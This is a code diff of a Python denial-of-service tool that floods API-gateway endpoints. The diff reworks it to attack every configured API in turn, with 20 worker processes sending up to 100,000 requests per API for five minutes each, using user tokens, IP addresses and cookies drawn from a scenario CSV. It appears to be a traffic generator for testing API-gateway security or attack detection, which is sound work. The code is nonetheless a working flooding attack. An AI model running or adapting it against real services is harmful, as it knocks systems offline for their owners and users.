@@ -71,13 +71,13 @@ class DOSAttackData:
         for user in user_list:
             self.users.append(User(user[6], user[4], user[7]))  # 4 = token, 5 = ip, 7 = cookie
 
-    def corrupt(self):
-        """
-        Generates arbitrary data for the request body
-
-        """
-        for i in range(number_of_requests.value):
-            self.dt.append(generate_random_string(random.randint(1, 3)) + random.choice(['\a', '\n', '\t', '\b', '\r', '\f']) + generate_random_string(random.randint(1, 3)))
+    # def corrupt(self):
+    #     """
+    #     Generates arbitrary data for the request body
+    #
+    #     """
+    #     for i in range(number_of_requests.value):
+    #         self.dt.append(generate_random_string(random.randint(1, 3)) + random.choice(['\a', '\n', '\t', '\b', '\r', '\f']) + generate_random_string(random.randint(1, 3)))
 
 
 def generate_random_json():
@@ -126,17 +126,17 @@ def inc_fault():
     fault.value += 1
 
 
-def init(ctr, fg, flt, time, requests):
+def init(ctr, fg, flt, time):
     """
     Initialize globals variables in a process memory space when the process pool is created
 
     """
-    global counter, status, flag, fault, start_time, number_of_requests
+    global counter, status, flag, fault, start_time
     counter = ctr
     flag = fg
     fault = flt
     start_time = time
-    number_of_requests = requests
+
 
 
 def log_request(path, data, mode):
@@ -214,7 +214,7 @@ def send_request(num):
             r = requests.get(url=urlreq, headers=header_data, timeout=(15, 30))
         elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):  # For other unexpected HTTPS errors, prints the error code.
             print(str(r.status_code))
-        elif counter.value >= number_of_requests.value:
+        elif counter.value >= number_of_requests_per_api:
             code = "Done"
         else:
             print('Sending crafted request: %s' % urlreq, flush=True)
@@ -229,10 +229,10 @@ def send_request(num):
 
 
 def handler_time(i):
-    global attack_duration
+    global attack_duration_per_api
     # attack_instance.corrupt()
 
-    if datetime.now().timestamp() <= start_time.value + attack_duration:
+    if datetime.now().timestamp() <= start_time.value + attack_duration_per_api:
         if flag.value < 2:
             code = send_request(i)
             if code == 500:
@@ -254,21 +254,17 @@ def handler(i):
 
 
 def attack():
-    print("-- DOS Attack Started --")
     start_time = multiprocessing.Value('f', datetime.now().timestamp())
     counter = multiprocessing.Value('i', 0)
     flag = multiprocessing.Value('i', 0)
     fault = multiprocessing.Value('i', 0)
-    number_of_requests = multiprocessing.Value('i', 20000)
-
-    log_request("../../logs/attacktool.csv", "timestamp,api,access_token,ip_address,cookie,invoke_path,http_method,response_code", "w")
-    p = Pool(processes=20, initializer=init, initargs=(counter, flag, fault, start_time, number_of_requests))
+    #number_of_requests = multiprocessing.Value('i', 100000)
+    global number_of_requests_per_api
+    p = Pool(processes=20, initializer=init, initargs=(counter, flag, fault, start_time))
     while datetime.now().timestamp() <= start_time.value + 2 * 60:
-        p.map_async(handler_time, range(number_of_requests.value + fault.value))
+        p.map_async(handler_time, range(number_of_requests_per_api + fault.value))
         p.close()
         p.join()
-
-    print("\n-- DOS Attack Finished")
 
 
 if __name__ == "__main__":
@@ -277,7 +273,8 @@ if __name__ == "__main__":
         config_data = yaml.load(config_file, Loader=yaml.FullLoader)
 
     # configurations
-    attack_duration = 5 * 60
+    attack_duration_per_api = 5 * 60
+    number_of_requests_per_api = 100000
     protocol = config_data['gateway-url']['protocol']
     host = config_data['gateway-url']['host']
     port = config_data['gateway-url']['port']
@@ -293,11 +290,18 @@ if __name__ == "__main__":
     # User data
     user_details = pd.read_csv(os.path.abspath(os.path.join(__file__, "../../data/user_scenario_distribution_output.csv")))
     user_details_groups = user_details.groupby('api_name')
-    user_data = user_details_groups.get_group(api_list[0].name).values.tolist()
 
-    attack_instance = DOSAttackData(api_list[0])
-    attack_instance.useragent_list()
-    attack_instance.parse_users(user_data)
+    # prepare log file
+    log_request("../../logs/attacktool.csv", "timestamp,api,access_token,ip_address,cookie,invoke_path,http_method,response_code", "w")
 
-    print(datetime.now())
-    attack()
+    print("---------------------- DDOS Attack Started ----------------------")
+
+    for api in api_list:
+        print("Attacking API {}".format(api.name))
+        user_data = user_details_groups.get_group(api.name).values.tolist()
+        attack_instance = DOSAttackData(api)
+        attack_instance.useragent_list()
+        attack_instance.parse_users(user_data)
+        attack()
+
+    print("\n---------------------- DDOS Attack Finished ----------------------")
